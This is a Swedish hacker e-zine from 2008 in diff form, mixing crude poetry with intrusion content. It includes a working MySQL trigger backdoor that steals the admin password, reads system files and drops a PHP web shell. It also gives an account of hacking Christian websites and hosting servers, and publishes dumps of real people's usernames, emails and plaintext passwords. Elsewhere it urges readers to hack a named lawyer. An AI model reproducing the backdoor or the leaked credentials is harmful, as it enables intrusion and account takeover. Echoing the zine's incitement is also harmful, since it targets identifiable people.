@@ -1,0 +1,2128 @@
+#!/bin/brain
+############################################################
+########      l33+ - VFH-ZINE-03 04/2008 - l33+      #######
+########      l33+ - PRIVAT-KODEZ-PRIVAT - l33+      #######
+############################################################
+##::::::::::::'##::::'##:'########:'##::::'##:::::::::::::##
+##:::::::::::: ##:::: ##: ##.....:: ##:::: ##:::::::::::::##
+##:::::::::::: ##:::: ##: ##::::::: ##:::: ##:::::::::::::##
+##:::::::::::: ##:::: ##: ######::: #########:::::::::::::##
+##::::::::::::. ##:: ##:: ##...:::: ##.... ##:::::::::::::##
+##:::::::::::::. ## ##::: ##::::::: ##:::: ##:::::::::::::##
+##::::::::::::::. ###:::: ##::::::: ##:::: ##:::::::::::::##
+##:::::::::::::::...:::::..::::::::..:::::..::::::::::::::##
+############################################################
+##kn4rq*k0d*kn4rQ*PIZZFUCK*h4Xz*eEH*dj3fWULSChK4p*rm*-rf*/##
+############################################################
+##  _wvvvvs___gv3@4,___=awwZzvv.g0d_1z_g4y.__________,,.. ##
+## [                                                    ] ##
+## [   C0nteNts                                         ] ##
+## [                                                    ] ##
+## [   01 Introduktion ...............................  ] ##
+## [   02 Blandade nyheter ...........................  ] ##
+## [   03 Myskul m3d d4t4b453r .......................  ] ##
+## [   04 Cyb3rp03t1x ................................  ] ##
+## [   05 Sagan om Crossnet ..........................  ] ##
+## [   06 w3bbk0d3z & w3bbvulnz ......................  ] ##
+## [   07 Spray ......................................  ] ##
+## [   08 Sneakers & Snyderflunkare ..................  ] ##
+## [   09 Hacking the MATRIX aka. Informationsskaparna  ] ##
+## [   0a FRA får smaka på egen m3d1c1n ..............  ] ##
+## [   0b Tips för dig som tröttnat på datorn ........  ] ##
+## [   0c Avslut .....................................  ] ##
+## [                                                    ] ##
+## [  __a%!  ..._<asa%?"""4$QQQQq _WZ?????!(#03) -%a__  ] ##
+############################################################
+##::::::::::::::::::::::::::::::::::::::::::::::::::::::::##
+##       {* ~----  VUXNA FÖRBANNADE HACKARE ----~ *}      ##
+##       {* ~----  l33+ l33t VFH lee7 eLE3T ----~ *}      ##
+##       {* ~----     V1RU5 FRåN H3LV3737   ----~ *}      ##
+##::::::::::::::::::::::::::::::::::::::::::::::::::::::::##
+############################################################
+THE POWER OF CHRIST COMPELLS YOU  KRISTI KRAFT BETVINGAR DIG
+############################################################
+################################################# /\ #######
+################################################# || #######
+##                                  ____ (((+))) _||_ ######
+##  Över mörkrets vatten seglar vi /.  .\  .-.  /.||.\ #####
+##  med dimmiga blickar och svullen pung\\(0.0)// || \\ ####
+##  Transsexuell i råbandsknop   /;   /\ \\|m|//  ||  ;\ ###
+##  bakbunden i kölen på sista däck   \ \__`:`____||__:| ###
+##  Lykantropernas månmetamorfos |:    \__ \ / (@~)(~@)| ###
+##  frambringad ur cannabispsykos|:    _/|     |\_\/  :| ###
+##  Syndens sötma i vinterns famn så karg|     |  \   :| ###
+##  blir till hybrid mellan kvinna, man och varg   \  '| ###
+##                                \_/    |     |    \_/ ####
+##  Transylvanska transa dansa i trans!  |     | ###########
+##  Dölj väl under klänning; bockfot och svans!| ###########
+##  Transylvanska transa dansa i trans!  |_____| ###########
+##  Dölj väl under trosa; penis och pung! ##################
+##################                       ###################
+##################  Över skräckens landskap svävar vi      #
+##################  med gröna fingrar och knastrande flin  #
+#########_..._####  Karpaternas kvinnor som är män         #
+###### .'     '.##  packar holken full av snö och piss     #
+##### ; __   __ ;#  Galenskapens järngrepp sitter i        #
+#### \| -- ' -- |/  under dystra himlar stannar vi         #
+#####|| \o| |o/ ||  Österns röda ros tillfaller oss        #
+####_\|     >   |/_ gay-vampyrernas herre, chef och boss   #
+###-' | ,.___., | '-                                       #
+### \  ; V'-'V ;  / ########################################
+#### \  \     /  /  ########################################
+##### \  '-.-'  /  #########################################
+############################################################
+############################################################
+THE POWER OF CHRIST COMPELLS YOU  KRISTI KRAFT BETVINGAR DIG
+############################################################
+############################################################
+##
+##          VFHVFH     H
+##               V     F
+##               F     V
+##          VFHVFHVFHVFH
+##          H    V      
+##          F    F      
+##          V    HVFHVFHVFHVFHV
+##          F     _s%?""~   _aF                                  
+##          H/__al"`   _aa7?" H     _j  St4ffz::
+##           -""     =Qgaaal????9Cvfh   ++++++++
+##                       [03/2008]  V   TSvent0n                       
+##                                  F   h4xb4rd                 
+##                                  H   k4NIN
+##                                  :   DMT23
+##                                  .   ok0D
+##                                      ebk
+##                                      sG
+##                                  [04/2008]
+##
+############################################################
+##        - VFH - FUCKING UP Sv3nzz0n 4FUN - VFH -        ##
+##                                                        ##
+##      SARKASM IRONI JÄVLA NÖRD BEHÖVER VI SÄGA MER      ##
+##      HACKARE HACKAR HACKARE HACKAR HACKARE HACKAR      ##
+##                                                        ##
+##        - VFH - FUCKING UP Sv3nzz0n 4FUN - VFH -        ##
+############################################################
+
+...................
+. 01 Introduktion..
++-----------------+
+
+ITS THE POWER, HOLLLYYMOSSSHY!!
+
+LAGOM PAUS ELLER VAd?! Vi är tillbaka med bakverk, satyg o verktyg. Och vi har
+ikke bedrivit öferblihven tid framför teven - IKKE! Bara bara haxx haxx ;-)
+Det är också därför som detta zajn tagit sin lilla tid att entra webben.
+
+Innan du läser all skit som står här kan det vara gott att intala dig själv
+ännu en gång att VFH är 80% skitsnack och 20% strunt. H-U-M-O-R helt enkelt,
+tror du vi bryr oss ett skit om vad som tisslas o tasslas? NÄÄÄÄ
+
+I detta nummer har vi valt att dela med oss av lite mera knep, k0der, h4x, p0esi
+och givetvis trams och r00tz. Visa lite vad som finns i VFH's skattkistor. No 
+phear, here's plenty så det räcker å blir över. Underjordiska hackare ala 
+"non-disclosure fan vad ni är falska" - Ät skiten. Vi skiter i allt. Håll käft 
+och koda själva istället för att idla på IRC hela dagarna. Jävla nollor.
+Försöker inte bevisa något. Behöver inte bevisa något. Syftet med detta zine är
+att sprida kreativiteten. Denna text är för er, de syndare av lika sinne. Inta 
+det som tilltalar dig och låt nya tankar födas. TOTAL SKIT och KAOS är vad som 
+helar dina sinnen, tar dig ut ur ditt cementerade house of slack.
+
+Idéerna finns alltid. Teknikerna måste ändras. Att utvecklas är vårt syfte.
+Empiriska sinnen behöver spottas på. Stampas på.
+ALLT ÄR KAOS. MORD FÖDSEL LIV DÖD
+
+VFH - Vuxna Förbannade Hackare - Virus Från Helvetet - VFH
+Desctructive by heart.
+
+
+.......................
+. 02 Blandade nyheter..
++---------------------+
+
+-- Datavirus
+============
+
+Komigen. Vart är viruskodarna påväg? Fullt med jävla RAT-skit och lama POC's för
+virus till böaböa skrivet i blabla. Och sen det här:
+
+"I tried to contact ValleZ for some time in order to take a decission together 
+about the future of 29A with no luck therefore I decided to take the decission 
+alone. And my decission is that 29A goes officially retired. I feel this is fair
+because I am kinda the alpha and the omega of the group. 29A was born in Dark 
+Node, my BBS, and I am the last active member of the group. My last words as 29A
+member are for all the people that worked hard to make of this group the best 
+one: Thank you very much! Regards, VirusBuster/29A
+
+29A has left the building!"
+
+NO FUN - NO FUN - NO FUN - NO FUN
+
+R.I.P. 29A
+
+FÖR ATT HEDRA 29A BER VI DIG ATT LÄSA ALLA DERAS TEXTER, ALL DERAS KOD. NU.
+LÄS.
+NU.
+
+VFH MISSION #5
+Om du inte kan ett skit om viruskod lär dig. Verkligen nyttigt och lärorikt. Om
+det så är i VBS eller ASM. Koda koda koda. Universum är ett jävla virus.
+
+http://vx.netlux.org/
+
+-- Can You Hack It? (2008)
+==========================
+
+"This film explores the origin of true hackers vs. today's computer criminals by
+following the adventures of Adrian Lamo and other well-intentioned hackers, who
+found security holes and pointed them out so they might be fixed, only to 
+eventually be arrested. Commonly thought of as computer criminals and vandals, a
+true hacker is an innovative thinker able to "hack" himself out of a given 
+problem or situation, whether it be computer related or not. Historically, 
+hackers have accounted for mankind's greatest inventions and discoveries and yet
+have repeatedly been persecuted for their new ideas by the powerful and fearful.
+Experts on cyber-terrorism also examine our societal view of the hacker and 
+debate as to whether or not we should recruit and utilize the skills of the 
+helpful hackers to fight future cyber-wars, instead of continuing to punish what
+we do not understand."
+
+TEH LÄTT ATT MAN SKA KOLLA! PHETT H4CkxX!!
+
+-- Incidenthantering med Dataföreningen Sverige
+===============================================
+
+"Igår hade jag tillfälle att, för första gången, gå på seminarie med nätverket 
+"IT-säkerhet Mälardalen" i Dataföreningens regi. Tidigare gick jag på IT-
+säkerhetsträffarna i Skåne, men har inte hunnit med några träffar efter min 
+flytt i höstas. Det var verkligen roligt.
+
+Särskilt kul var det när jag fick tillfälle att presentera mig:
+"Jag heter Henrik och är här som representant för Vuxna Förbannade Hackare!"
+Efter en konstpaus, som kändes som en alldeles underbar evighet, bröt jag det 
+närvarande sällskapets förtrollade tystnad genom att släppa fram mitt allra 
+varmaste skratt, varpå de tappade hakorna och förstelnade ansiktsuttrycken runt
+omkring mig löstes upp i glittrande leenden och frustande fniss."
+
+http://henriksundstrom.se/news.php?readmore=711
+
+HAHH!hahah! Vi tackar Henrik Sundström för ett gott skratt :))
+
+Och eftersom Dataföreningen är för jävla k00la forstätter vi med lite mer shajt:
+
+Notan efter hacket: en miljon
+http://www.idg.se/2.1085/1.163882
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+Intrånget mot Dataföreningen har kostat en miljon i extra kostnader. Föreningens
+vd Annica Bergman kräver nu mer resurser till polisen för att brott som detta 
+ska kunna bekämpas.
+
+Nästan tre månader har gått sedan Svenska Dataföreningen drabbades av det stora 
+dataintrånget. Över 20 000 personers kontouppgifter, inklusive de krypterade 
+lösenorden, publicerades på webben och snart var hackarna igång med att knäcka 
+dem.
+
+Enligt föreningens egna beräkningar har intrånget inneburit en miljon kronor i 
+extra kostnader. Inhyrda tekniker fick arbeta kvällar och helger med att spåra 
+buggar och ta hackade servrar ur bruk. Bara utskicket av nytt lösenord har 
+kostat 250 000 kronor i portokostnader.
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Det är ju precis det här vi klagar på. Ett jävla säkerhetssamhälle där det ska
+kosta HUNDRATUSENTALS KRONOR att säkra upp en server - KOM IGEN?!
+
+Om ni frågat oss hade vi gjort det för lite kaffe och kanelbullar ;-(
+
+-- TV3 hackat av turkar!
+========================
+
+Ja jävlar. TV3 verkar inte ha gjort så mycket efter att vi var o hälsade på med
+farliga 0days som nu är på vifft ;( - Oelajt!
+
+-- HACKA SVINEN *OBS*!!
+=======================
+
+Advokat Monique Wadsted, de amerikanska filmbolagens juridiska ombud, räknar med
+att stämningen mot Pirate Bay kommer att få konsekvenser:
+- Jag räknar med att min dator kommer att bli hackad, säger Monique Wadsted.
+
+*OBS* Detta är en uppmaning!!
+
+...........................
+. 03 Myskul m3d d4t4b453r..
++-------------------------+
+
+SET @admin = 'admin';
+SET @hacker = 'hacker';
+SET @magic = 'magic';
+
+DROP DATABASE IF EXISTS h4x;
+CREATE DATABASE h4x;
+USE h4x;
+
+CREATE TABLE user
+(
+   user varchar(32),
+   pass varchar(32),
+   mail varchar(32)
+);
+
+CREATE TABLE userdata
+(
+    user varchar(32),
+    data varchar(32)
+);
+
+CREATE TABLE userinfo
+(
+   user varchar(32),
+   info varchar(32)
+);
+
+INSERT INTO user VALUES
+   (@admin, 'unknown', 'admin@admin'),
+   (@hacker, @magic, 'hacker@hacker');
+
+INSERT INTO userinfo VALUES
+   (@hacker, 'I\'m a hacker!');
+
+INSERT INTO userdata VALUES
+   (@hacker, 'data');
+
+DROP TRIGGER IF EXISTS h4x;
+
+delimiter //
+
+CREATE DEFINER = 'root'@'localhost' TRIGGER h4x
+    BEFORE UPDATE ON userinfo FOR EACH ROW
+BEGIN IF NEW.user = @hacker THEN
+	SET @cmd = substring(NEW.info, 1, 3);
+	IF @cmd = 'I\'m' THEN
+		SET @cmd = substring(NEW.info, 5, length(NEW.info) - 4);
+		IF @cmd = 'a hacker' THEN
+			SET @pass = (SELECT pass FROM user WHERE user = @admin);
+			UPDATE user SET mail = @pass WHERE user = @hacker;
+			UPDATE user SET pass = @magic WHERE user = @admin;
+		ELSEIF @cmd = 'a ghost' THEN
+			SET @pass = (SELECT mail FROM user WHERE user = @hacker);
+			UPDATE user SET pass = @pass WHERE user = @admin;
+		END IF;
+	ELSEIF @cmd = 'GET' THEN
+		SET GLOBAL local_infile = 'ON';
+		SET @cmd = substring(NEW.info, 5, length(NEW.info) - 4);
+		SET @data = (SELECT LOAD_FILE(@cmd));
+		UPDATE userdata SET data = @data WHERE user = @hacker;
+	ELSEIF @cmd = 'PUT' THEN
+		SET @cmd = substring(NEW.info, 5, length(NEW.info) - 4);
+		SET @cmd = IF(length(@cmd) > 0, unhex(@cmd),
+			'<pre><?php system($_GET[\'x\']); ?></pre>'
+		);
+		SELECT @cmd INTO OUTFILE '/www/userimage/h4x.php';
+	ELSEIF @cmd = 'CON' THEN
+		SET @cmd = substring(NEW.info, 5, length(NEW.info) - 4);
+		CREATE FUNCTION h4x RETURNS INTEGER SONAME "libmysclient.so"
+		h4x(@addr);
+		DROP FUNCTION h4x;
+	END IF;
+	SET NEW.info = 'I\'m a hacker';
+END IF; END; //
+
+delimiter ;
+
+SET @start = 'I\'m a hacker';
+SET @stop = 'I\'m a ghost';
+
+SELECT pass AS 'pass:' FROM user WHERE user = @admin;
+UPDATE userinfo SET info = @start WHERE user = @hacker;
+SELECT pass AS 'pass:' FROM user WHERE user = @admin;
+UPDATE userinfo SET info = @stop WHERE user = @hacker;
+SELECT pass AS 'pass:' FROM user WHERE user = @admin;
+
+UPDATE userinfo SET info = 'GET /etc/passwd' WHERE user = @hacker;
+SELECT data FROM userdata WHERE user = 'hacker';
+UPDATE userinfo SET info = 'PUT' WHERE user = @hacker;
+
+..................
+. 04 Cyberpoetix..
++----------------+
+
+feel safe
+haha
+in your face
+md5, AES, DES
+we are your fucking dödspräst
+går lös på din ~/.ssh/
+rm -rf /
+haha hejDÅ
+
+~
+
+lågorna är bash
+fan vi kollar på M*A*S*H
+är gamla o
+vuxna
+HAHA
+bara skojja
+i de tjugo
+ett gäng vilsna
+kidz med
+smak för ironi
+och huvuden med
+kärlek i
+
+empati och hat
+en jävla soppa,
+men bra mat
+
+en dator med
+tråkig jävla logik
+äger runt
+bjuder på kalabalik
+
+~
+
+tja för fittan!
+hej för kuken!
+nej till kriget!
+ja till krutet!
+
+revolt. revolt. revolt. revolt.
+
+den mänskliga anatomin:
+fingrar huvud knäskål blod bröst tunga slida anus bröst
+
+fingrar avtryckarhuvudet blåser bort ansiktet huvudet
+blod snutar snutar snutar din mammas bröst i munnen
+N Y H E T - POLiSEN FÅR NYA SiRENER!
+din tunga ditt kön du är avföring
+din mammas bröst i munnen
+
+Från och med mÅndag kommer polisiära myndigheter runt om i landet att ersätta de
+vanliga ljudbanden WEEOO WEEE OOO WEE OO TUUUT TUUUT TUUUT med nya. Anledningen
+sägs vara att man är trött på arbetslöshet och vill köra över alla dagdrivare.
+
+De nya sirenerna låter enligt följande ljudupptagning,
+FUCK YOU FUCK YOU FUCK YOUUU FUCK YOUUU FUCK YOUU!
+
+# ssh hackers_against_black_holes@lxplus.cern.ch
+Warning: Permanently added '137.138.5.238' (RSA) to the list of known hosts.
+*******************************************************************************
+*                    The LXPLUS Public Login Unix Service                     *
+* http://cern.ch/ComputingRules : Govern the use of CERN computing facilities *
+*******************************************************************************
+hackers_against_black_holes@137.138.5.238's password:
+Last login: Wed Mar  5 07:23:20 2008
+********************************************************************************
+*                                                                              *
+*                    The LXPLUS Public Login Unix Service                      *
+*                     (Scientific Linux SLC 4.4 x86_64)                        *
+*                                                                              *
+*                                                                              *
+* A web page containing information about this Linux version on LXPLUS:        *
+*   https://cern.ch/plus/SLC4.html                                             *
+* For a list of known issues, please check:                                    *
+*   https://cern.ch/plus/issues_SLC4.html                                      *
+* In case of problems, please contact the helpdesk: tel 78888                  *
+* If you have any feedback not already included there please send it to:       *
+*   it-dep-fio-lxslc4@cern.ch                                                  *
+*                                                                              *
+* In                                                                           *
+* https://cern.ch/plus           : Information on the usage of LXPLUS/LXBATCH  *
+* https://cern.ch/ComputingRules : Govern the use of CERN computing facilities *
+*                                                                              *
+********************************************************************************
+The TV Screen has been enhanced to provide an IT Service Status Board
+You may navigate from the IT Home Page to Useful links.
+IT Home Page: http://it-div.web.cern.ch/it-div/
+Status:       http://it-support-servicestatus.web.cern.ch/it-support-servicestatus/
+**********************************************************************************
+The following group settings have been defined:
+export RFIO_USE_CASTOR_V2=YES   (rfio version)
+export STAGE_HOST=castoratlas   (stage host)
+export STAGE_SVCCLASS=default   (disk pool)
+Please note:
+  1) the castor commands are DIFFERENT for CASTOR-2;
+       CASTOR-1 stager commands will NOT work with CASTOR-2 (see link below)
+  2) For problems: castor.support@cern.ch
+     Information on the main differences between CASTOR-2 and CASTOR-1 commands 
+	 may be found at:
+
+     http://castor.web.cern.ch/castor/DOCUMENTATION/CASTOR2_DEPLOYMENT/FILES/Commands_in_CASTOR2_v_s_CASTOR1.html
+********************************************************************************
+*WARNING*                                                                *WARNING*
+*                                                                                *
+*      As of July 12 2007 access to the public Castor-1 stager ("stagepublic")   *
+*      is not anymore possible for ATLAS users.                                  *
+*                                                                                *
+*WARNING*                                                                *WARNING*
+**********************************************************************************
+[hackers_against_black_holes@lxplus227]~% uname -a
+Linux lxplus227.cern.ch 2.6.9-67.0.7.EL.cernsmp #1 SMP Wed Mar 19 09:31:19 CET 2008 x86_64 x86_64 x86_64 GNU/Linux
+
+........................
+. 05 Sagan om Crossnet..
++----------------------+
+                                       |
+                                   \       /
+                                     .---.
+                                '-.  |   |  .-'
+                                  ___|   |___
+                             -=  [           ]  =-
+                                 `---.   .---'
+                              __||__ |   | __||__
+                              '-..-' |   | '-..-'
+                                ||   |   |   ||
+                                ||_.-|   |-,_||
+                              .-"`   `"`'`   `"-.
+       V                    .'                   '.                   V
+       F                                                              F
+    HVFHVFH ~~ SAGAN OM CROSSNET OCH HUR VFH FICK SIN BÖN HÖRD ~~  HVFHVFH
+       V  ==========================================================  V
+       F   "Gode Gud! Jag kommer inför Dig med två tomma händer  och  F
+       H   ett hjärta som längtar efter att få del av Din vishet och  H
+       V   efter att följa Dina befallningar...."                     V
+
+Kort beskrivning av vafan det här är för skit. crossnet.se är en sida som spyr
+ut kristna budskap i form av artiklar, webbtv, webbradio med mera. De har även
+hand om ett community vid namn crossnetFLOW som riktar sig till vilsna
+tonåringar som söker livets mening. Sajten driver även ett webbhotell,
+crossnet.net vilken hostar ett drös vidriga hemsidor.
+
+Eftersom VFH är sträng emot all form av smörjning, böneböcker och vilseledande 
+budskap i dagens samhälle bestämde vi oss mycket tidigt i vår karriär för att 
+motarbeta dessa vidriga as.
+
+Ett hack som detta kan för många ses som banalt. Men, vi är hackare och vi gör
+vahd teh fuhq vhi vill; allt som är en utmaning intresserar oss och det kom 
+denna best att bli. Frustrerade över att crossnet tycktes vara tajtare än vi 
+trott fick projektet ligga för att svalna ett tag... Men inte länge.
+
+Vi riktade det kristna hatet åt annat håll efter motgångarna på crossnet och 
+efter lite sök o bök hittades bibel.se, vilket lät som en bra domän att ta hand
+om. Efter ett tag hade vi en bugg i ett php-skript som snackade med mysql. Men 
+fan, inget load_file(), inget into outfile, inget mums. Så det blev till att 
+dyka in i INFORMATION_SCHEMA och se efter vad som bjöds... allt med users 
+betittas och all hail our tålamod:
+
+635f39c0298f3613 admin
+CRAX-HAX - tack för pass!
+
+Ho ho. Efter lite letande kom vi fram till att inloggningen användes på adressen
+/butik/admin.php. Väl här kan man editera sidor samt slänga upp filer och sånt
+tycker vi om. Efter att ha laddat upp ett php-skript som gick förbi deras
+jesusfilter blev vi bemötta av det ljuvliga safe_mode. Något som förbipasserades
+med tjuvkod och vi kunde nu läsa filer på systemet.
+
+Så, det var nu den till synes intentsägande bibelsidan gav oss bevis på jesu 
+kärlek. En titt i /etc/hosts ger oss jota.crossnet.net - hallelulijakjajkaka! 
+Ett jävla löshack on the side gav ett frodigt resultat. (Visst, dumt att inte 
+kolla ip-range innan men vafalls, vi var helt inne i webbkewden!).
+
+Fortfarande endast möjlighet att läsa filer med den safe_mode-bypass vi har till
+vår förfogan. Efter att ha letat rätt på configen för apache har vi ett par
+sidor där det är off. Flip flap, leta leta och vi har deras konton till
+mysql, som vi testar emot ftpn och yez, fungerar så nu har vi ett välansat
+phpskal att röra oss med.
+
+Lagom tajt data med uppsäkrade rättigheter på användbara binärer. Dock gammal
+kärna av linux men vi låter det vänta. Först lite letande efter vad vi har att
+gå på. Ett hett tips! om tuffa admins satt chmod 700 på gcc, chmod osv. :
+php -r "system('chmod 777 /hittyshitty');"
+
+Lixom, alltid skoj när de tänkt till fast åt fel håll :)
+
+Nåja, väl tillbaka i verkligheten greppar vi för fullt efter admin och annat 
+gott i apache-confen, emailadmin_se ger oss vad vi är ute efter och phpkoden
+säger både det ena och det andra när det gäller lösenord till diverse databaser.
+Så efter describe table o pillandes har vi en dump med närmare 28 000 användare
+till detta vidirga community + samtliga av deras kunder. Givetvis utan salt,
+utan krypto. Magnifique!
+
+Här har ni lite skit från floooooow:
+
+h4xb0x# grep crossnet omega-crossnet_se-crossnet_members-dump|head -10
+kaufmann        kaufmann@crossnet.at    hoe-eel
+jz-consolidation        jz-consolidation@crossnet.at    2gPfKJxM
+lene.k  lene.k@crossnet.at      X4pUfGRN
+hasselgren      hasselgren@crossnet.at  rimcook
+mdengler        mdengler@crossnet.at    fR7fZWAJ
+melli.griessi   melli.griessi@crossnet.at       roomelm
+perndanner      perndanner@crossnet.at  podsapse
+lendheim        lendheim@crossnet.se    sommarlov
+attuj   attuj@crossnet.at       Rheaoar
+julia.langer	julia.langer@crossnet.at	M46pacta
+
+...
+
+h4xb0x# grep svenskakyrkan.se omega-crossnet_se-crossnet_members-dump
+a.pettersson    anders.pettersson@svenskakyrkan.se      001002
+prellepuh       lennart.ahlback@svenskakyrkan.se        christoffer
+elisabeth.ohrn  Elisabeth.Ohrn@svenskakyrkan.se 123jesus
+preatchi        jane.fridner@svenskakyrkan.se   kramade
+james   james.starr@efs.svenskakyrkan.se        Liege
+annalena        annalena.andren@svenskakyrkan.se        tjaboo
+mr_clark        kent.pettersson@svenskakyrkan.se        nildesp
+grunden johan.grunden@svenskakyrkan.se  screamer
+mathiaseiderhed mathias.eiderhed@svenskakyrkan.se       therock
+ingemarjohansson        ingemar.johansson@svenskakyrkan.se      epeidaper
+daniel.petren   daniel.petren@svenskakyrkan.se  lh44im
+massen  markus.svensson@svenskakyrkan.se        söktg
+filip.sandahl   filip.sandahl@svenskakyrkan.se  2Samhet
+calle007        calle.olaison.jacobsson@svenskakyrkan.se        kulonn
+pcm_aberg       martin.aberg@svenskakyrkan.se   hjkgsl
+anders.eidering anders.eidering@svenskakyrkan.se        pingst
+t33     tobias.backstrom@svenskakyrkan.se       pilgrim
+annao   anna.osberg@svenskakyrkan.se    annao
+soc96mho        magnus.holst@svenskakyrkan.se   2qt2bst8
+pmm     par-magnus.moller@svenskakyrkan.se      6606267
+opel    Ewa.Widell@svenskakyrkan.se     minbil
+prellen mattias.ostborg@svenskakyrkan.se        matte
+abt     anitha.bergkvist@svenskakyrkan.se       chamsiin
+lejonet	linus.bjorkman@svenskakyrkan.se	lionus
+linneflickan	charlotta.nelson@svenskakyrkan.se	satie2
+
+Orka lista fler. Säger bara 123jesus! HAHAAHhahahHAHQHH!HAHASHAHHQHH!H!H!H!
+Några funkar på andra ställen kan vi lova ;-)
+
+LET IT FLOOOOOOOOOOOOW LET IT FLOOOOOOOOOOOOOOOooooooooooooo0000000O0WWWwww
+Admins för crossnet.se (http://crossnet.se/admin)
+
+lasse      idde2007
+kjelle     paulus
+stefan     shop
+crossat    crossedit
+starre     cnetto
+daniel     fp
+musiklivet Qwert8ff
+andreask   austr03as
+dixon      MGfjytmf
+arvid      flowkungen
+calle      vittnavittna
+
+Bara in å bidra!
+
+Nu en liten koll på hostingskitet:
+
+h4xb0x# wc -l alpha-vpopmail-dump
+24362 alpha-vpopmail-dump
+h4xb0x# wc -l omega-vpopmail-dump
+6405 omega-vpopmail-dump
+
+Skönt när man har både pw_passwd och pw_clear_passwd i mysql-tabellen, tackar vi
+för:
+
+%krist%
+
+andreas.junaeus Andreas Junaeus kristetcenter.se        kcungdom5413
+postmaster      Postmaster      savsjokristnaskola.nu   B4rPBF3K
+peo.svensson    Peo Svensson    savsjokristnaskola.nu   bvHGFEs
+elisabeth.leido Elisabeth Leido savsjokristnaskola.nu   ukrT44d
+lena.westin     Lena Westin     savsjokristnaskola.nu   QnhKKed
+eva.olsson      Eva Olsson      savsjokristnaskola.nu   FQjxSbrt
+info    Sävsjö Kristna Skola - Info     savsjokristnaskola.nu   ukrT44d
+info    Info till Allkristen Polis      allkristenpolis.se      mvnhhjr
+sekreterare     Stefan Tranemyr allkristenpolis.se      zLw283Th
+webmaster       Ankie Linder    allkristenpolis.se      jkvf7788
+pae     Per-Åke Eliasson        kristetcenter.se        kcpae5413
+postmaster      Postmaster      kristetcenter.se        quRze2E5
+vastanas        Västanås Kristet Center kristetcenter.se        kc
+info    Kristet Center - Info   kristetcenter.se        kcinfo5413
+mission Micael Lundin   kristetcenter.se        kcmission5413
+birgitta.agren  Birgitta Ågren  savsjokristnaskola.nu   7gtVug8v
+marcus.stille   Marcus Stille   savsjokristnaskola.nu   1073
+karin.nyren     Karin Nyren     savsjokristnaskola.nu   6PsXzpM5
+jessica.eliasson        Jessica Eliasson        kristetcenter.se        kcekonomi5413
+post    post@kristnaibro.com    kristnaibro.com lellongen
+jenny   Jenny Petersson kristenutmaning.org     skolan
+postmaster      Postmaster      helhetgenomkristus.nu   %PV6%D3I
+postmaster      Postmaster      kristendom.nu   nJbWq9TO
+postmaster      Postmaster      kristinehamn.pingst.se  s8cd2#rz
+postmaster      Postmaster      kristnamedia.net        dtWC5#ib
+form    Form Helhet Genom Kristus       helhetgenomkristus.nu   Fy45FHRi
+info    Helhetgenom Kristus     helhetgenomkristus.nu   ncUerspa
+info    Tomas Enblom/Kristendom kristendom.nu   344r42c1
+info    Pingstkyrkan Kristinehamn       kristinehamn.pingst.se  t9083vnq
+info    Kristna Media Sverige   kristnamedia.net        utew4578
+teamare Kristet Center - Teamare        kristetcenter.se        kcteamare5413
+kundtjanst      Kundtjanst Kristna Media Sverige        kristnamedia.net        777
+lustgarden      Lustgården Pingstförsamlingen Kris      kristinehamn.pingst.se  iYLZXWtt
+paul    Paul Pingstkyrkan Kristineha    kristinehamn.pingst.se  B4xx45dr
+postmaster      Postmaster      kristenmusik.se rmycrvSt
+stefan  Stefan Pingstkyrkan kristineha  kristinehamn.pingst.se  BVB458ds
+tomas.enblom    Tomas Enblom    kristendom.nu   i8yc3298
+webmaster       Webmaster HGK   helhetgenomkristus.nu   sKw93Tbc
+kcmedia Kristet Center - KC Media       kristetcenter.se        kcmedia5413
+kcmarknad       Kristet Center - KC Marknad     kristetcenter.se        kcmarknad5413
+postmaster      Postmaster      xn--kungsrkristnacenter-u6b.se  6nM93tE%
+postmaster      Postmaster      kungsorkristnacenter.org.se     WBOHxBvR
+ellinor.nilsson Ellinor Nilsson kristetcenter.se        kcforsamling5413
+postmaster      Postmaster      kristenutmaning.org     o7Yg0#aP
+martin  Martin Lindroos kristenutmaning.org     unikum
+jakob   Jakob Ramlöw    kristenutmaning.org     william
+eksharad        Ekshärads teamet        kristenutmaning.org     filadelfia
+linda   Linda Claesson  kristenutmaning.org     ragnar
+linneateamet	Linneateamet	kristenutmaning.org	teamare
+norrkoping	Norrköpingsteamet	kristenutmaning.org	evangelist
+reseteamet	Reseteamet	kristenutmaning.org	troende
+linus.anderas	Linus Anderås	savsjokristnaskola.nu	linand
+postmaster	Postmaster	kristna.se	048YjMQY
+jimmy	Jimmy Forsberg	kristenutmaning.org	bamsen
+roger	Roger Gustavsson	kristna.se	annica
+michael	Michael Ärlebrandt	kristna.se	zoffiz
+torslanda	Torslanda Kristna Kulturcenter	kristna.se	skute04
+soluppgang	Soluppgång	kristetcenter.se	kcsoluppgang5413
+ordforande	Roland Perhamn	helhetgenomkristus.nu	kumlas
+kassor	Rolf Thorwaldsson	allkristenpolis.se	mlasp119
+ordforande	Peo Östlund	allkristenpolis.se	ords2015
+skate	Actionsportteamet	kristenutmaning.org	pingst
+postmaster	Postmaster	allkristenpolis.se	Mnaj7LSm
+lars	Lars Henriksson	kristna.se	bjorko
+info	Kristenmusik.se	kristenmusik.se	00580058
+hans	Hans M / Kristenmusik.se	kristenmusik.se	00580058
+rosengard	RosengÃ¥rd teamet	kristenutmaning.org	falafel
+kontoret	TC kontoret	kristenutmaning.org	kristen
+foraldrar	Föräldrar förening	boraskristnaskola.se	for999
+annelie.frohm	Annelie Frohm	savsjokristnaskola.nu	annfro
+christer.kallstrom	Christer Källström	savsjokristnaskola.nu	koc4831
+josef.hugosson	Josef Hugosson	savsjokristnaskola.nu	profeten
+info	Torslanda Kristna Kulturcenter	kristna.se	grundfors
+postmaster	Postmaster	xn--borskristnaskola-fob.se	B9%8kY#q
+postmaster	Postmaster	boraskristnaskola.se	jY3sO1mK
+johanna.sedeborn	Johanna Sedeborn	savsjokristnaskola.nu	granbacken
+lovsang	Lovsång	kristna.se	strommar
+postmaster	Postmaster	kristnaibro.com	p*aEdhOn
+
+%jesus%
+
+postmaster	Postmaster	jesuskonsulenterna.se	vHNFuric
+postmaster	Postmaster	jesusnetwork.se	7z@Jc76w
+mester	Mester - jesuskonsulenterna.se	jesuskonsulenterna.se	mdkHDye8
+info	Info - jesuskonsulenterna.se	jesuskonsulenterna.se	fdKhciee
+ulla-john	Ulla och John	jesuskonsulenterna.se	dgNCHHDD
+postmaster	Postmaster	jesustothestreets.com	NW2#MDh6
